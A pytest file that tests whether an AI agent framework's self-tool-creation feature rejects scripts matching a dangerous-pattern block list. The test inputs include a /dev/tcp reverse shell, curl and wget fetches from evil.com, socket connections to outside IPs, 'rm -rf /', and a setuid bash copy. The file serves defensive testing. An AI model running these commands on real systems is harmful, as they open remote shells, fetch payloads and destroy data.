"""Tool hardening tests.

self_create_tool script content validation — dangerous patterns in
_DANGEROUS_PATTERNS are rejected at create time with a clear error
message that names the pattern.

(The code_evolve SystemExit-during-restart coverage that used to live
here was removed along with CodeEvolveTool._apply/._rollback: those
actions are now refused unconditionally before ever calling
restart_process -- see SR-1.2/1.3 and
tests/tools/test_code_evolve.py::TestHumanOperatorOnlyActionsRefused.
The CLI's `missy evolve apply/rollback` commands let SystemExit from
restart_process propagate naturally, which is the correct behavior for
a CLI process exiting.)
"""

from __future__ import annotations

from unittest.mock import patch

import pytest

# ---------------------------------------------------------------------------
# 1: self_create_tool dangerous-pattern validation
# ---------------------------------------------------------------------------


class TestSelfCreateToolScriptValidation:
    """SelfCreateTool.execute(action='create') must reject scripts that
    contain patterns from _DANGEROUS_PATTERNS and accept clean scripts."""

    @pytest.fixture
    def tool(self, tmp_path):
        """Return a SelfCreateTool instance whose custom-tools dir is tmp_path."""
        from missy.tools.builtin.self_create_tool import SelfCreateTool

        tool = SelfCreateTool()
        # Redirect the tools directory to an isolated temp path so tests do not
        # touch ~/.missy/custom-tools and leave no artefacts behind.
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            yield tool

    # ------------------------------------------------------------------
    # Individual dangerous-pattern rejections
    # ------------------------------------------------------------------

    def test_curl_in_script_is_rejected(self, tool, tmp_path):
        """A script containing 'curl ' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="badtool",
                language="python",
                script="import sys\ncurl https://evil.com/payload > /tmp/x\nprint('done')",
            )
        assert result.success is False
        assert result.error is not None
        assert "curl" in result.error

    def test_wget_in_script_is_rejected(self, tool, tmp_path):
        """A script containing 'wget ' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="badtool2",
                language="bash",
                script="#!/bin/bash\nwget http://malicious.example.com/file -O /tmp/evil",
            )
        assert result.success is False
        assert result.error is not None
        assert "wget" in result.error

    def test_eval_in_script_is_rejected(self, tool, tmp_path):
        """A script containing 'eval(' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="evaltool",
                language="python",
                script="data = input()\neval(data)",
            )
        assert result.success is False
        assert result.error is not None
        assert "eval(" in result.error

    def test_exec_in_script_is_rejected(self, tool, tmp_path):
        """A script containing 'exec(' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="exectool",
                language="python",
                script="code = open('payload.py').read()\nexec(code)",
            )
        assert result.success is False
        assert result.error is not None
        assert "exec(" in result.error

    def test_os_system_in_script_is_rejected(self, tool, tmp_path):
        """A script containing 'os.system(' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="systool",
                language="python",
                script="import os\nos.system('rm -rf /')",
            )
        assert result.success is False
        assert result.error is not None
        assert "os.system(" in result.error

    def test_subprocess_call_in_script_is_rejected(self, tool, tmp_path):
        """A script containing 'subprocess.call(' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="subproctool",
                language="python",
                script="import subprocess\nsubprocess.call(['id'])",
            )
        assert result.success is False
        assert result.error is not None
        assert "subprocess.call(" in result.error

    def test_import_socket_in_script_is_rejected(self, tool, tmp_path):
        """A script containing 'import socket' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="sockettool",
                language="python",
                script="import socket\ns = socket.socket()\ns.connect(('10.0.0.1', 4444))",
            )
        assert result.success is False
        assert result.error is not None
        assert "import socket" in result.error

    def test_chmod_setuid_in_script_is_rejected(self, tool, tmp_path):
        """A script containing 'chmod +s' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="setuidtool",
                language="bash",
                script="#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod +s /tmp/bash",
            )
        assert result.success is False
        assert result.error is not None
        assert "chmod +s" in result.error

    def test_dev_tcp_in_script_is_rejected(self, tool, tmp_path):
        """A script containing '/dev/tcp/' must be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="devtcptool",
                language="bash",
                script="#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            )
        assert result.success is False
        assert result.error is not None
        assert "/dev/tcp/" in result.error

    # ------------------------------------------------------------------
    # Clean script accepted
    # ------------------------------------------------------------------

    def test_clean_script_without_dangerous_patterns_is_accepted(self, tool, tmp_path):
        """A well-formed script with no dangerous patterns is written successfully."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="clean_tool",
                language="python",
                script=("#!/usr/bin/env python3\nimport sys\nprint('Hello from clean_tool')\n"),
                tool_description="A perfectly safe tool",
            )
        assert result.success is True
        assert result.error is None
        assert "clean_tool" in result.output

    # ------------------------------------------------------------------
    # Case-insensitive matching
    # ------------------------------------------------------------------

    def test_pattern_matching_is_case_insensitive_curl_uppercase(self, tool, tmp_path):
        """Pattern matching must be case-insensitive; 'CURL ' should be caught."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="uppercasetool",
                language="bash",
                script="#!/bin/bash\nCURL https://evil.com/payload",
            )
        assert result.success is False
        assert result.error is not None

    def test_pattern_matching_is_case_insensitive_eval_mixed_case(self, tool, tmp_path):
        """'Eval(' in mixed case should also be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="mixedcasetool",
                language="python",
                script="Eval(input('code: '))",
            )
        assert result.success is False
        assert result.error is not None

    def test_pattern_matching_is_case_insensitive_wget_mixed_case(self, tool, tmp_path):
        """'Wget ' in title case should also be rejected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="wgettitletool",
                language="bash",
                script="#!/bin/bash\nWget http://evil.com/script.sh",
            )
        assert result.success is False
        assert result.error is not None

    # ------------------------------------------------------------------
    # Error message content
    # ------------------------------------------------------------------

    def test_error_message_names_the_specific_pattern_curl(self, tool, tmp_path):
        """The error message must reference the exact pattern that was matched."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="curlpatterncheck",
                language="bash",
                script="curl https://evil.com/x",
            )
        assert result.success is False
        # The repr of the pattern (e.g. 'curl ') must appear in the error
        assert "curl " in result.error

    def test_error_message_names_the_specific_pattern_exec(self, tool, tmp_path):
        """Error message for exec( must name 'exec('."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="execpatterncheck",
                language="python",
                script="exec(open('evil.py').read())",
            )
        assert result.success is False
        assert "exec(" in result.error

    def test_error_message_names_the_specific_pattern_import_socket(self, tool, tmp_path):
        """Error message for import socket must name 'import socket'."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="socketpatterncheck",
                language="python",
                script="import socket\nsocket.create_connection(('1.2.3.4', 9999))",
            )
        assert result.success is False
        assert "import socket" in result.error

    def test_error_message_contains_guidance_about_restriction(self, tool, tmp_path):
        """The error message must explain *why* the script was rejected, not just
        state the pattern — it should mention network access or privilege."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            result = tool.execute(
                action="create",
                tool_name="guidancetool",
                language="bash",
                script="curl https://evil.com/x",
            )
        assert result.success is False
        # The implementation includes a human-readable policy message alongside
        # the pattern name.
        error_lower = result.error.lower()
        assert any(
            kw in error_lower for kw in ("network", "dangerous", "privilege", "execution")
        ), f"Expected policy explanation in error, got: {result.error!r}"

    # ------------------------------------------------------------------
    # Warning is logged for rejections
    # ------------------------------------------------------------------

    def test_warning_is_logged_when_dangerous_pattern_found(self, tool, tmp_path):
        """logger.warning must be called when a dangerous pattern is detected."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            with patch("missy.tools.builtin.self_create_tool.logger") as mock_logger:
                tool.execute(
                    action="create",
                    tool_name="loggingtest",
                    language="python",
                    script="import os\nos.system('id')",
                )
            mock_logger.warning.assert_called_once()
            warning_args = str(mock_logger.warning.call_args)
            assert "dangerous" in warning_args.lower() or "pattern" in warning_args.lower()

    def test_no_warning_logged_for_clean_script(self, tool, tmp_path):
        """logger.warning must NOT be called when the script is clean."""
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", tmp_path):
            with patch("missy.tools.builtin.self_create_tool.logger") as mock_logger:
                tool.execute(
                    action="create",
                    tool_name="cleanloggingtest",
                    language="python",
                    script="print('safe')\n",
                )
            mock_logger.warning.assert_not_called()
